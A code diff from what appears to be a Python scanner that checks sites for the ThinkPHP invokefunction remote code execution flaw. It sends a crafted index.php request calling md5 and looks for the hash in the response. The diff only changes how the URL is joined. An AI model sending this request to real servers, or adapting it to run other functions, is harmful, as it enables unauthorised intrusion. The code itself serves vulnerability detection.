@@ -35,8 +35,8 @@ def run(url, timeout):
 
     for controller in controllers:
         try:
-            payload = f'index.php?s={controller}/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=2333'
-            vurl = urllib.parse.urljoin(url, payload)
+            payload = f'/index.php?s={controller}/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=2333'
+            vurl = url + payload
             req = requests.get(vurl, headers=headers, timeout=15, verify=False)
             if "56540676a129760a3" in req.text:
                 result['vulnerable'] = True
